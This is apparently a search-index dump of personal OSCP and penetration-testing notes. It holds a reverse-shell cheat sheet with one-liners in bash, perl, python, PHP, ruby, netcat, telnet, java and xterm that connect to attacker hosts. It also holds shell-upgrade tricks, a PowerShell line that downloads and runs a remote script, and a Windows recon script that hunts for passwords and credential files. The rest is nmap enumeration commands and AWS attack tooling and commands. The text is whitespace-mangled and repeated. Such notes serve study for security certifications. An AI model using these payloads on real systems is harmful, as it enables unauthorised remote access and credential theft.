tcp Java r = Runtime . getRuntime () p = r . exec ( [ /bin/bash , -c , exec 5 /dev/tcp/10.0.0.1/2002;cat 5 | while read line; do \\$line 2 5 5; done ] as String [] ) p . waitFor () Xterm xterm - display attackerip : 1 # Or : DISPLAY = attackerip : 0 xterm On solaris / usr / openwin / bin / xterm - display attackerip : 1 Xnest : 1 xterm - display 127.0 . 0.1 : 1 # Run this OUTSIDE the Xnest xhost + targetip # Run this INSIDE the spawned xterm on the open X Server Gawk `` References http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet https://www.gnucitizen.org/blog/reverse-shell-with-bash","title":"Bash"},{"location":"certifications/oscp/cheatsheet/shell/#bash","text":"bash - i / dev / tcp / 10 . 0 . 0 . 1 / 8080 0 1 exec / bin / bash 0 0 2 0 0 196 ;exec 196 /dev/tcp/attackerip/4444; sh 196 196 2 196 Create a new descriptor which is assigned to a network node. Then we will read and write to that descriptor (does not work in Debian): exec 5 / dev / tcp / attackerip / 4444 cat 5 | while read line ; do $line 2 5 5; done # or : while read line 0 5 ; do $line 2 5 5; done Banner a HTTP server using Bash: #!/bin/bash exec 3 /dev/tcp/ $1 /80 echo -e Get /simple?se=1 HTTP/1.0\\n 3 cat 3","title":"Bash"},{"location":"certifications/oscp/cheatsheet/shell/#perl","text":"Unix: perl - e use Socket;$i= 10.0.0.1 ;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname( tcp ));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN, S );open(STDOUT, S );open(STDERR, S );exec( /bin/sh -i );}; perl - MIO - e $p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr, attackerip:4444 );STDIN- fdopen($c,r);$~- fdopen($c,w);system$_ while ; # Without IO perl - MIO :: Socket - e $p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr = 127.0.0.1:1234 );STDIN- fdopen($c,r);$~- fdopen($c,w);system$_ while ; Windows perl - MIO - e $c=new IO::Socket::INET(PeerAddr, attackerip:4444 );STDIN- fdopen($c,r);$~- fdopen($c,w);system$_ while ; # Without IO perl - MIO :: Socket - e $c=new IO::Socket::INET(PeerAddr = 127.0.0.1:1234 );STDIN- fdopen($c,r);$~- fdopen($c,w);system$_ while ; print $ sock eval ( $ sock ) while ( $ sock ||= IO :: Socket :: INET - new ( PeerAddr = 127.0.0.1 , PeerPort = 23666 ))","title":"Perl"},{"location":"certifications/oscp/cheatsheet/shell/#python","text":"python - c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(( 10.0.0.1 ,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([ /bin/sh , -i ]);","title":"Python"},{"location":"certifications/oscp/cheatsheet/shell/#php","text":"php - r $sock=fsockopen( 10.0.0.1 ,1234);exec( /bin/sh -i 3 3 2 3 ); ? php $ sock = fsockopen ( 10.0.0.1 , 1234 ) ;exec( /bin/sh -i 3 3 2 3 ); ?","title":"PHP"},{"location":"certifications/oscp/cheatsheet/shell/#ruby","text":"Unix ruby - rsocket - e f=TCPSocket.open( 10.0.0.1 ,1234).to_i;exec sprintf( /bin/sh -i %d %d 2 %d ,f,f,f) ruby - rsocket - e exit if fork;c=TCPSocket.new( attackerip , 4444 );while(cmd=c.gets);IO.popen(cmd, r ){|io|c.print io.read}end Windows ruby - rsocket - e c=TCPSocket.new( attackerip , 4444 );while(cmd=c.gets);IO.popen(cmd, r ){|io|c.print io.read}end","title":"Ruby"},{"location":"certifications/oscp/cheatsheet/shell/#netcat","text":"nc - e / bin / sh 10 . 0 . 0 . 1 1234 nc - c / bin / sh 10 . 0 . 0 . 1 1234 / bin / sh | nc attackerip 4444 rm / tmp / f ; mkfifo / tmp / f ; cat / tmp / f |/ bin / sh - i 2 1 | nc 10 . 0 . 0 . 1 1234 / tmp / f rm - f / tmp / p ; mknod / tmp / p p nc attackerip 4444 0 / tmp / p 2 1 Two connections: nc localhost 1233 | / bin / sh | nc 127 . 0 . 0 . 1 1234","title":"NetCat"},{"location":"certifications/oscp/cheatsheet/shell/#telnet","text":"rm - f / tmp / p ; mknod / tmp / p p telnet attackerip 4444 0 / tmp / p 2 1 telnet attackerip 4444 | / bin / bash | telnet attackerip 4445 # Remember to listen on your machine also on port 4445 / tcp","title":"Telnet"},{"location":"certifications/oscp/cheatsheet/shell/#java","text":"r = Runtime . getRuntime () p = r . exec ( [ /bin/bash , -c , exec 5 /dev/tcp/10.0.0.1/2002;cat 5 | while read line; do \\$line 2 5 5; done ] as String [] ) p . waitFor ()","title":"Java"},{"location":"certifications/oscp/cheatsheet/shell/#xterm","text":"xterm - display attackerip : 1 # Or : DISPLAY = attackerip : 0 xterm On solaris / usr / openwin / bin / xterm - display attackerip : 1 Xnest : 1 xterm - display 127.0 . 0.1 : 1 # Run this OUTSIDE the Xnest xhost + targetip # Run this INSIDE the spawned xterm on the open X Server","title":"Xterm"},{"location":"certifications/oscp/cheatsheet/shell/#gawk","text":"``","title":"Gawk"},{"location":"certifications/oscp/cheatsheet/shell/#references","text":"http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet https://www.gnucitizen.org/blog/reverse-shell-with-bash","title":"References"},{"location":"certifications/oscp/cheatsheet/tty/","text":"TTY python - c import pty; pty.spawn( /bin/sh ) python - c import pty; pty.spawn( /bin/bash ) python3 - c import pty; pty.spawn( /bin/bash ) echo os . system ( /bin/bash ) / bin / sh - i perl \u2014 e exec /bin/sh ; perl : exec /bin/sh ; ruby : exec /bin/sh lua : os . execute ( /bin/sh ) IRB : exec /bin/sh vi : : ! bash vi : : set shell =/ bin / bash : shell nmap : ! sh web ttys https://github.com/maxmcd/webtty socat On Kali (listen): socat file : `tty` , raw , echo = 0 tcp - listen : 4444 On Victim (launch): socat exec : bash -li , pty , stderr , setsid , sigint , sane tcp : 10 . 10 . 10 . 10 : 4444 wget - q https : // github . com / andrew - d / static - binaries / raw / master / binaries / linux / x86_64 / socat - O / tmp / socat ; chmod +x /tmp/socat; /tmp/socat exec: bash -li ,pty,stderr,setsid,sigint,sane tcp:10.10.10.10:4444 netcat Send nc to background Check the term name and size on local machine with: echo $ TERM stty - a stty raw - echo fg to being nc back up reset export SHELL = bash xterm export TERM = xterm stty rows 38 columns 116 Row and column values are found using stty - a . References https://netsec.ws/?p=337 http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/ https://forum.hackthebox.eu/discussion/142/obtaining-a-fully-interactive-shell","title":"TTY"},{"location":"certifications/oscp/cheatsheet/tty/#tty","text":"python - c import pty; pty.spawn( /bin/sh ) python - c import pty; pty.spawn( /bin/bash ) python3 - c import pty; pty.spawn( /bin/bash ) echo os . system ( /bin/bash ) / bin / sh - i perl \u2014 e exec /bin/sh ; perl : exec /bin/sh ; ruby : exec /bin/sh lua : os . execute ( /bin/sh ) IRB : exec /bin/sh vi : : ! bash vi : : set shell =/ bin / bash : shell nmap : ! sh","title":"TTY"},{"location":"certifications/oscp/cheatsheet/tty/#web-ttys","text":"https://github.com/maxmcd/webtty","title":"web ttys"},{"location":"certifications/oscp/cheatsheet/tty/#socat","text":"On Kali (listen): socat file : `tty` , raw , echo = 0 tcp - listen : 4444 On Victim (launch): socat exec : bash -li , pty , stderr , setsid , sigint , sane tcp : 10 . 10 . 10 . 10 : 4444 wget - q https : // github . com / andrew - d / static - binaries / raw / master / binaries / linux / x86_64 / socat - O / tmp / socat ; chmod +x /tmp/socat; /tmp/socat exec: bash -li ,pty,stderr,setsid,sigint,sane tcp:10.10.10.10:4444","title":"socat"},{"location":"certifications/oscp/cheatsheet/tty/#netcat","text":"Send nc to background Check the term name and size on local machine with: echo $ TERM stty - a stty raw - echo fg to being nc back up reset export SHELL = bash xterm export TERM = xterm stty rows 38 columns 116 Row and column values are found using stty - a .","title":"netcat"},{"location":"certifications/oscp/cheatsheet/tty/#references","text":"https://netsec.ws/?p=337 http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/ https://forum.hackthebox.eu/discussion/142/obtaining-a-fully-interactive-shell","title":"References"},{"location":"certifications/oscp/cheatsheet/web/","text":"Web Scaning Droopescan: SilverStripe Wordpress, Joomla, Moodle, Drupal: https://github.com/droope/droopescan","title":"Web"},{"location":"certifications/oscp/cheatsheet/web/#web","text":"","title":"Web"},{"location":"certifications/oscp/cheatsheet/web/#scaning","text":"Droopescan: SilverStripe Wordpress, Joomla, Moodle, Drupal: https://github.com/droope/droopescan","title":"Scaning"},{"location":"certifications/oscp/cheatsheet/windows/","text":"Windows General cat = type Powershell echo IEX (( New - Object System . Net . WebClient ). DownloadString ( http://10.10.14.9:8000/PowerUp.ps1 )) | powershell - noprofile - Services List all: sc query state = all Prev Escalation PowerUp.ps1 Sherlock.ps1","title":"Windows"},{"location":"certifications/oscp/cheatsheet/windows/#windows","text":"","title":"Windows"},{"location":"certifications/oscp/cheatsheet/windows/#general","text":"cat = type","title":"General"},{"location":"certifications/oscp/cheatsheet/windows/#powershell","text":"echo IEX (( New - Object System . Net . WebClient ). DownloadString ( http://10.10.14.9:8000/PowerUp.ps1 )) | powershell - noprofile -","title":"Powershell"},{"location":"certifications/oscp/cheatsheet/windows/#services","text":"List all: sc query state = all","title":"Services"},{"location":"certifications/oscp/cheatsheet/windows/#prev-escalation","text":"PowerUp.ps1 Sherlock.ps1","title":"Prev Escalation"},{"location":"certifications/oscp/cheatsheet/enumeration/network/","text":"Scan for hosts nmap - sn $ iprange - oG - | grep Up | cut - d - f2 network . txt Port scanning TCP Top 1000: nmap - Pn - sC - sV - oA tcp - vv $ ip Quick TCP nmap - sC - sV - vv - oA quick 10 . 10 . 10 . 10 All TCP Ports: nmap - sC - sV - oA all - vv - p - $ ip UDP Top 100: nmap - Pn - sU --top-ports 100 -oA udp -vv $ip Quick UDP nmap - sU - sV - vv - oA quick_udp 10 . 10 . 10 . 10 Port Knocking for x in 7000 8000 9000 ; do nmap -Pn --host_timeout 201 --max-retries 0 -p $x 10.10.10.10; done","title":"Network"},{"location":"certifications/oscp/cheatsheet/enumeration/network/#scan-for-hosts","text":"nmap - sn $ iprange - oG - | grep Up | cut - d - f2 network . txt","title":"Scan for hosts"},{"location":"certifications/oscp/cheatsheet/enumeration/network/#port-scanning","text":"","title":"Port scanning"},{"location":"certifications/oscp/cheatsheet/enumeration/network/#tcp-top-1000","text":"nmap - Pn - sC - sV - oA tcp - vv $ ip","title":"TCP Top 1000:"},{"location":"certifications/oscp/cheatsheet/enumeration/network/#quick-tcp","text":"nmap - sC - sV - vv - oA quick 10 . 10 . 10 . 10","title":"Quick TCP"},{"location":"certifications/oscp/cheatsheet/enumeration/network/#all-tcp-ports","text":"nmap - sC - sV - oA all - vv - p - $ ip","title":"All TCP Ports:"},{"location":"certifications/oscp/cheatsheet/enumeration/network/#udp-top-100","text":"nmap - Pn - sU --top-ports 100 -oA udp -vv $ip","title":"UDP Top 100:"},{"location":"certifications/oscp/cheatsheet/enumeration/network/#quick-udp","text":"nmap - sU - sV - vv - oA quick_udp 10 . 10 . 10 . 10","title":"Quick UDP"},{"location":"certifications/oscp/cheatsheet/enumeration/network/#port-knocking","text":"for x in 7000 8000 9000 ; do nmap -Pn --host_timeout 201 --max-retries 0 -p $x 10.10.10.10; done","title":"Port Knocking"},{"location":"certifications/oscp/cheatsheet/enumeration/vulnerability/","text":"Search searchsploit --exclude=dos -t apache 2.2.3 msfconsole ; search apache 2 . 2 . 3","title":"Vulnerability"},{"location":"certifications/oscp/cheatsheet/enumeration/vulnerability/#search","text":"searchsploit --exclude=dos -t apache 2.2.3 msfconsole ; search apache 2 . 2 . 3","title":"Search"},{"location":"certifications/oscp/cheatsheet/enumeration/windows-local/","text":"localrecon.cmd https://github.com/bitsadmin/miscellaneous/blob/master/localrecon.cmd @echo off REM REM This software is provided under under the BSD 3 - Clause License . REM See the accompanying LICENSE file for more information . REM REM Utility to generate a summary of a Windows system REM REM Author : REM Arris Huijgen ( @ _ bitsadmin ) REM REM Website : REM https : // github . com / bitsadmin / REM REM TODO : REM * Check drives other than C :\\ ( if available ) REM * Add commandline parameter to perform a brief check or more extended REM * Make sure that the output of this script is not again included in the output REM REM Some more ( untested ) commands : REM pushd C :\\ ^ ^ findstr / I / N / S / P / R flag password secret confidential account payroll credit record * ^ ^ popd REM dir C :\\ / S / O - D / TW ^ | findstr / C : Directory of / C : %d% !;! REM dir C :\\ / a - r - d / s / b REM To add : for / F tokens=2* delims= %%i in ( sc query ^| find /I ce_name ) do @sc qc %i %j REM setlocal enabledelayedexpansion set o= %tmp%\\recon%random%.out set d=- 12 - 2016 REM Define a separator character (!;!) ( set ; =^ %=Do not remove this line=% ) set t [ 0 ][ name ] = Basic 1 set t [ 0 ] = COMPUTERNAME !;! USERDNSDOMAIN !;! USERNAME !;! HOMEDRIVE !;! HOMEPATH set t [ 1 ][ name ] = Basic 2 set t [ 1 ] = systeminfo !;! wmic logicaldisk get caption , description , drivetype , providername , volumename ^ | more set t [ 2 ][ name ] = Users set t [ 2 ] = query session !;! net user !;! net localgroup Administrators !;! net user Administrator !;! tree / F C :\\ Users !;!dir /s /b /A:H C :\\ Users \\ ^|find /V desktop . ini !;!tree /F C :\\ Documents and Settings !;!dir /s /b /A:H C :\\ Documents and Settings \\ ^|find /V desktop . ini set t[3][name]=Network set t[3]=ipconfig /all!;!route print!;!arp -a!;!netstat -ano!;!net session ^| find \\\\ !;! net view !;! netsh advfirewall show allprofiles !;! netsh firewall show state !;! netsh firewall show config !;! nltest / dclist : set t [ 4 ][ name ] = Processes , services and tasks set t [ 4 ] = wmic PROCESS get Processid , Caption , Commandline ^ | more !;! query process * !;! tasklist / SVC !;! net start !;! DRIVERQUERY / V !;! schtasks / query / fo LIST / v !;! at !;! dir / B C :\\ WINDOWS \\ Tasks !;! set ^ | find / V t[ set t [ 5 ][ name ] = Patch - level set t [ 5 ] = wmic qfe get Caption , Description , HotFixID , InstalledOn ^ | more set t [ 6 ][ name ] = Base image configuration files set t [ 6 ] = dir / s / b C :\\sysprep . inf C :\\sysprep . xml C :\\unattend . txt C :\\ Unattended . xml C :\\ Services . xml C :\\ ScheduledTasks . xml C :\\ Printers . xml C :\\ Drives . xml C :\\ DataSources . xml set t [ 7 ][ name ] = Configuration set t [ 7 ] = reg query HKLM \\ SOFTWARE \\ Policies \\ Microsoft \\ Windows \\ Installer \\ AlwaysInstallElevated !;! reg query HKCU \\ SOFTWARE \\ Policies \\ Microsoft \\ Windows \\ Installer \\ AlwaysInstallElevated !;! reg query HKLM \\ System \\ CurrentControlSet \\ Services \\ NfsSvr \\ Parameters \\ SafeSetUidGidBits !;! reg query HKLM \\ System \\ CurrentControlSet \\ Services \\ NfsServer \\ Parameters \\ SafeSetUidGidBits !;! gpresult / z set t [ 8 ][ name ] = Credentials set t [ 8 ] = cmdkey / list !;! dir / s / b / a : - D C :\\*pass * C :\\*cred * C :\\*vnc * C :\\*.config * C :\\*.kdb* !;! findstr / si password *.xml *.ini *.txt *.ps1 *.cmd !;! reg query HKLM / f password / t REG_SZ / s !;! reg query HKCU / f password / t REG_SZ / s !;! reg query HKLM \\ SOFTWARE \\ Microsoft \\ Windows NT \\ CurrentVersion \\ Winlogon / V Default * set t [ 9 ][ name ] = Remote Desktop applications and VPN set t [ 9 ] = dir / b / s C :\\*vnc . ini !;! reg query HKCU \\ SOFTWARE \\ ORL \\ WinVNC3 \\ Password !;! dir / s / b C :\\*.rdp C :\\*.pbk !;! reg query HKCU \\ Software \\ SimonTatham \\ PuTTY \\ Sessions !;! reg query HKCU \\ Software \\ Microsoft \\ Terminal Server Client \\ Servers /s set t[9][name]=Configuration 2 set t[9]=wmic service get name,displayname,pathname,startmode^|findstr /i Auto ^|findstr /i /v C :\\ Windows \\\\ ^|findstr /i /v set t [ 10 ][ name ] = Files set t [ 10 ] = dir / S / A / B C :\\network - secret . txt C :\\proof . txt C :\\local . txt C :\\*.vsd * C :\\*flag * C :\\*password * C :\\*bank * C :\\*competit * C :\\*finance * C :\\*invoice * C :\\*risk * C :\\*key * C :\\*.pcf C :\\*.crt C :\\*.key C :\\*.log ^ | find / V / I %SystemRoot%\\winsxs\\ ^| find /I /V %SystemRoot%\\Microsoft.NET\\ set t [ 11 ][ name ] = E - mail and documents set t [ 11 ] = dir / S / A / B *.dbx *.wab *.doc *.docx *.xlsx set t [ 12 ][ name ] = Pre - installed languages set t [ 12 ] = where python !;! where perl !;! where ruby !;! dir / s / b C :\\python . exe C :\\pythonw . exe C :\\perl . exe C :\\ruby . exe C :\\rubyw . exe C :\\bash . exe C :\\java . exe C :\\javaw . exe C :\\php . exe C :\\powershell . exe set last = 12 :: CMD variables echo --------------- [ 0 / %last%] %t[0][name]% --------------- %o% 2 1 echo --------------- [ 0 / %last%] %t[0][name]% --------------- FOR / F %%i IN ( !t[0]! ) DO ( echo =^ %%~i echo %%i: !%%i! %o% 2 1 ) :: Commands FOR / L %%n IN (1,1,%last%) DO ( echo . %o% 2 1 echo . %o% 2 1 echo --------------- [ %%n/%last%] !t[%%n][name]! --------------- %o% 2 1 echo . echo --------------- [ %%n/%last%] !t[%%n][name]! --------------- FOR / F delims=; %%i IN ( !t[%%n]! ) DO ( set c= %%~i echo =^ ! c ! %o% 2 1 echo =^ ! c ! REM If command does not contain a pipe , execute directly REM Otherwise execute using cmd / c IF ! c ! == ! c : ^ | = ! ( ! c ! %o% 2 1 ) ELSE ( cmd / C !c! %o% 2 1 ) echo . %o% 2 1 echo . %o% 2 1 ) ) REM Results echo . echo Done . Results in %o%.","title":"Windows local"},{"location":"certifications/oscp/cheatsheet/enumeration/windows-local/#localreconcmd","text":"https://github.com/bitsadmin/miscellaneous/blob/master/localrecon.cmd @echo off REM REM This software is provided under under the BSD 3 - Clause License . REM See the accompanying LICENSE file for more information . REM REM Utility to generate a summary of a Windows system REM REM Author : REM Arris Huijgen ( @ _ bitsadmin ) REM REM Website : REM https : // github . com / bitsadmin / REM REM TODO : REM * Check drives other than C :\\ ( if available ) REM * Add commandline parameter to perform a brief check or more extended REM * Make sure that the output of this script is not again included in the output REM REM Some more ( untested ) commands : REM pushd C :\\ ^ ^ findstr / I / N / S / P / R flag password secret confidential account payroll credit record * ^ ^ popd REM dir C :\\ / S / O - D / TW ^ | findstr / C : Directory of / C : %d% !;! REM dir C :\\ / a - r - d / s / b REM To add : for / F tokens=2* delims= %%i in ( sc query ^| find /I ce_name ) do @sc qc %i %j REM setlocal enabledelayedexpansion set o= %tmp%\\recon%random%.out set d=- 12 - 2016 REM Define a separator character (!;!) ( set ; =^ %=Do not remove this line=% ) set t [ 0 ][ name ] = Basic 1 set t [ 0 ] = COMPUTERNAME !;! USERDNSDOMAIN !;! USERNAME !;! HOMEDRIVE !;! HOMEPATH set t [ 1 ][ name ] = Basic 2 set t [ 1 ] = systeminfo !;! wmic logicaldisk get caption , description , drivetype , providername , volumename ^ | more set t [ 2 ][ name ] = Users set t [ 2 ] = query session !;! net user !;! net localgroup Administrators !;! net user Administrator !;! tree / F C :\\ Users !;!dir /s /b /A:H C :\\ Users \\ ^|find /V desktop . ini !;!tree /F C :\\ Documents and Settings !;!dir /s /b /A:H C :\\ Documents and Settings \\ ^|find /V desktop . ini set t[3][name]=Network set t[3]=ipconfig /all!;!route print!;!arp -a!;!netstat -ano!;!net session ^| find \\\\ !;! net view !;! netsh advfirewall show allprofiles !;! netsh firewall show state !;! netsh firewall show config !;! nltest / dclist : set t [ 4 ][ name ] = Processes , services and tasks set t [ 4 ] = wmic PROCESS get Processid , Caption , Commandline ^ | more !;! query process * !;! tasklist / SVC !;! net start !;! DRIVERQUERY / V !;! schtasks / query / fo LIST / v !;! at !;! dir / B C :\\ WINDOWS \\ Tasks !;! set ^ | find / V t[ set t [ 5 ][ name ] = Patch - level set t [ 5 ] = wmic qfe get Caption , Description , HotFixID , InstalledOn ^ | more set t [ 6 ][ name ] = Base image configuration files set t [ 6 ] = dir / s / b C :\\sysprep . inf C :\\sysprep . xml C :\\unattend . txt C :\\ Unattended . xml C :\\ Services . xml C :\\ ScheduledTasks . xml C :\\ Printers . xml C :\\ Drives . xml C :\\ DataSources . xml set t [ 7 ][ name ] = Configuration set t [ 7 ] = reg query HKLM \\ SOFTWARE \\ Policies \\ Microsoft \\ Windows \\ Installer \\ AlwaysInstallElevated !;! reg query HKCU \\ SOFTWARE \\ Policies \\ Microsoft \\ Windows \\ Installer \\ AlwaysInstallElevated !;! reg query HKLM \\ System \\ CurrentControlSet \\ Services \\ NfsSvr \\ Parameters \\ SafeSetUidGidBits !;! reg query HKLM \\ System \\ CurrentControlSet \\ Services \\ NfsServer \\ Parameters \\ SafeSetUidGidBits !;! gpresult / z set t [ 8 ][ name ] = Credentials set t [ 8 ] = cmdkey / list !;! dir / s / b / a : - D C :\\*pass * C :\\*cred * C :\\*vnc * C :\\*.config * C :\\*.kdb* !;! findstr / si password *.xml *.ini *.txt *.ps1 *.cmd !;! reg query HKLM / f password / t REG_SZ / s !;! reg query HKCU / f password / t REG_SZ / s !;! reg query HKLM \\ SOFTWARE \\ Microsoft \\ Windows NT \\ CurrentVersion \\ Winlogon / V Default * set t [ 9 ][ name ] = Remote Desktop applications and VPN set t [ 9 ] = dir / b / s C :\\*vnc . ini !;! reg query HKCU \\ SOFTWARE \\ ORL \\ WinVNC3 \\ Password !;! dir / s / b C :\\*.rdp C :\\*.pbk !;! reg query HKCU \\ Software \\ SimonTatham \\ PuTTY \\ Sessions !;! reg query HKCU \\ Software \\ Microsoft \\ Terminal Server Client \\ Servers /s set t[9][name]=Configuration 2 set t[9]=wmic service get name,displayname,pathname,startmode^|findstr /i Auto ^|findstr /i /v C :\\ Windows \\\\ ^|findstr /i /v set t [ 10 ][ name ] = Files set t [ 10 ] = dir / S / A / B C :\\network - secret . txt C :\\proof . txt C :\\local . txt C :\\*.vsd * C :\\*flag * C :\\*password * C :\\*bank * C :\\*competit * C :\\*finance * C :\\*invoice * C :\\*risk * C :\\*key * C :\\*.pcf C :\\*.crt C :\\*.key C :\\*.log ^ | find / V / I %SystemRoot%\\winsxs\\ ^| find /I /V %SystemRoot%\\Microsoft.NET\\ set t [ 11 ][ name ] = E - mail and documents set t [ 11 ] = dir / S / A / B *.dbx *.wab *.doc *.docx *.xlsx set t [ 12 ][ name ] = Pre - installed languages set t [ 12 ] = where python !;! where perl !;! where ruby !;! dir / s / b C :\\python . exe C :\\pythonw . exe C :\\perl . exe C :\\ruby . exe C :\\rubyw . exe C :\\bash . exe C :\\java . exe C :\\javaw . exe C :\\php . exe C :\\powershell . exe set last = 12 :: CMD variables echo --------------- [ 0 / %last%] %t[0][name]% --------------- %o% 2 1 echo --------------- [ 0 / %last%] %t[0][name]% --------------- FOR / F %%i IN ( !t[0]! ) DO ( echo =^ %%~i echo %%i: !%%i! %o% 2 1 ) :: Commands FOR / L %%n IN (1,1,%last%) DO ( echo . %o% 2 1 echo . %o% 2 1 echo --------------- [ %%n/%last%] !t[%%n][name]! --------------- %o% 2 1 echo . echo --------------- [ %%n/%last%] !t[%%n][name]! --------------- FOR / F delims=; %%i IN ( !t[%%n]! ) DO ( set c= %%~i echo =^ ! c ! %o% 2 1 echo =^ ! c ! REM If command does not contain a pipe , execute directly REM Otherwise execute using cmd / c IF ! c ! == ! c : ^ | = ! ( ! c ! %o% 2 1 ) ELSE ( cmd / C !c! %o% 2 1 ) echo . %o% 2 1 echo . %o% 2 1 ) ) REM Results echo . echo Done . Results in %o%.","title":"localrecon.cmd"},{"location":"cloud/aws/","text":"Tools \u200b https://awspolicygen.s3.amazonaws.com/policygen.html https://github.com/toniblyx/my-arsenal-of-aws-security-tools#offensive https://github.com/RhinoSecurityLabs/Security-Research/tree/master/tools/aws-pentest-tools https://github.com/andresriancho/enumerate-iam Amazon Web Services In Plain English: https://expeditedsecurity.com/aws-in-plain-english/ The AWS exploitation framework, designed for testing the security of Amazon Web Services environments: https://github.com/RhinoSecurityLabs/pacu Security tool to perform AWS security best practices assessments: https://github.com/toniblyx/prowler AWS IAM Security Assessment tool that identifies violations of least privilege and generates a risk-prioritized HTML report: https://github.com/salesforce/cloudsplaining WeirdAAL (AWS Attack Library): https://github.com/carnal0wnage/weirdAAL barq: The AWS Cloud Post Exploitation framework!: https://github.com/Voulnet/barq References https://github.com/toniblyx/my-arsenal-of-aws-security-tools https://anir0y.live/class/blog/securityaudit-aws/ Unauthenticated AWS Role Enumeration (IAM Revisited): https://rhinosecuritylabs.com/aws/aws-role-enumeration-iam-p2/ EBS Search exposed EBS volumes for secrets: https://github.com/BishopFox/dufflebag You can identify EBS volumes / snapshots owned bya specific company if you know their AWS account IDs . Which you may be able to find from other data seepage tecniques , eg . if they leak it in source code , or if you are able to do any recon of any of their other AWS resources that would include the account ID in any ARNs S3 New References S3 Book: https://github.com/nagwww/aws-s3-book https://github.com/mxm0z/awesome-sec-s3 Collections https://github.com/nagwww/101-AWS-S3-Hacks Hack : Add ACL to an Object . Grant Read privilages to the bucket using canonical user id Hack : Add ACL to an object . Grant Read privilages to the bucket using email address Hack : Add ACL to the bucket . Grant Read privilages to the bucket using canonical user id Hack : Add ACL to the bucket . Grant Read privilages to the bucket using email address Hack : Add a tag to S3 bucket Hack : Add lifecycle to S3 Folder Hack : Add lifecycle to S3 bucket Hack : Add lifecycle to S3 bucket , set the effective date . Don t specify the time or specify GMT midnight Hack : Add lifecycle to S3 bucket , set the effective days Hack : Check if a key exists Hack : Compute MD5 for an S3 object Hack : Configure this bucket to act as a website Hack : Convert an existing key in an S3 bucket that uses the STANDARD to RRS Hack : Copy the current key to a different Bucket Hack : Copy the current key to a different Bucket with Reduced Redundancy Storage ( RRS ) Hack : Create a Bucket in S3 Hack : Create a S3 bucket in a different region EU Hack : Create a folder in a S3 bucket Hack : Create a new object in S3 Hack : Delete a S3 bucket Hack : Delete a s3 object Hack : Delete all cors for the s3 bucket Hack : Delete all files in a folder Hack : Delete lifecycle to S3 bucket Hack : Delete tags of a S3 bucket Hack : Disable Logging for the S3 bucket Hack : Disable a buckets Versioning Hack : Disable a lifecycle to S3 bucket Hack : Download a S3 file or a S3 object Hack : Download a file using the method get_file Hack : Enable Logging for the S3 bucket Hack : Enable Versioning Hack : Find out the status of the Bucket Versioning Hack : Generate a URL for the S3 bucket with an expiration time 20 seconds Hack : Generate a URL for the S3 object with expiration of 5 min Hack : Get CORS for an S3 bucket Hack : Get CORS for an S3 bucket as xml Hack : Get a metadata value name name added to the S3 object Hack : Get all the S3 regions Hack : Get all the metadata added to the S3 object Hack : Get all the versions of the S3 Objects Hack : Get an expiry date of a key / object in S3 Hack : Get lifecycle to S3 bucket Hack : Get lifecycle to S3 bucket as xml Hack : Get status of the restore of an object from glacier Hack : Get the ACL of the S3 bucket Hack : Get the ACL of the object Hack : Get the ACL of the object as xml Hack : Get the Location of the s3 bucket Hack : Get the bucket Policy Hack : Get the canonical user id of the S3 bucket Hack : Get the content type of object . Note only works with get_key Hack : Get the contents of the object as a string Hack : Get the get_xml_acl of an S3 object Hack : Get the redirect for an S3 object Hack : Get the tags of a S3 bucket Hack : Get the website configuration for this s3 bucket Hack : Get the website configuration in xml for this s3 bucket Hack : Get the website_endpoint of a s3 bucket Hack : How to add an exception Hack : How to enable debugging for S3 Hack : List all the S3 buckets Hack : List all the grants for a given Bucket Hack : List all the objects Owner Hack : List all the objects in a S3 bucket Hack : List all the objects last modified timestamp in Zulu format Hack : List all the objects size in bytes Hack : List all the objects with in a bucket Hack : List all the objects with in a bucket and if the object is moved to Glacier Hack : List all the objects with in a bucket with a prefix Hack : List all the objects with the versions for a given Bucket Hack : List whether the object is encrypted while at rest on the server Hack : Logging status for the S3 bucket Hack : Make S3 bucket public readable Hack : Make a http connection to S3 instead of https Hack : Make an object public Hack : Move s3 objects to Glacier Hack : Move s3 objects to Glacier add a Expiration Hack : Restore an object from glacier Hack : Search for bucket in a different AWS Region Hack : Search for a bucket with bucket name which is case sensitive Hack : Search for a specific bucket Hack : Set a canned ACL for object , authenticated - read Hack : Set a canned ACL for object , canned_bucket_owner_full_control Hack : Set a canned ACL for object , canned_bucket_owner_read Hack : Set a canned ACL for object , public read Hack : Set a canned ACL for object , public read write Hack : Set a canned ACL , authenticated - read Hack : Set a canned ACL , private Hack : Set a canned ACL , public - read Hack : Set a canned ACL , public - read - write Hack : Set a private canned ACL for an object Hack : Set a redirect for an S3 object Hack : Set metadata for a new s3 object on creation Hack : Set set_request_payment for a bucket Hack : Set the bucket Policy Hack : Set the meta data for an object Hack : Set up CORS for an S3 bucket Hack : Upload a file to S3 bucket using method initiate_multipart_upload . Note should be 5 MB Hack : Upload a file to S3 bucket using method set_contents_from_filename Hack : Upload a file to s3 bucket using the method send_file aws s3 sync s3 : // developers - secret - bucket . / developers - secret - bucket aws s3 cp s3 : // developers - secret - bucket . / developers - secret - bucket1 --recursive aws dynamodb scan --table-name CardDetails awslogs groups awslogs streams / aws / lambda / DataExtractor awslogs get / aws / lambda / DataExtractor aws lambda list-event-source-mappings --profile main event-source-mappings.json aws lambda list-functions --profile main lambda-functions.json cat lambda-functions.json | jq -r .Functions[] | .FunctionName | while read -r line ; do aws lambda list-aliases --function-name $line --profile main lambda- $line -aliases.json aws lambda list-function-event-invoke-configs --function-name $line --profile main lambda- $line -event-invoke-configs.json aws lambda list-versions-by-function --function-name $line --profile main lambda- $line -versions.json cat lambda- $line -versions.json | jq -r .Versions[] | .Version | while read -r versionline ; do aws lambda get-function --function-name $line --qualifier $versionline --profile main lambda- $line -version- $versionline .json mkdir lambda- $line -version- $versionline 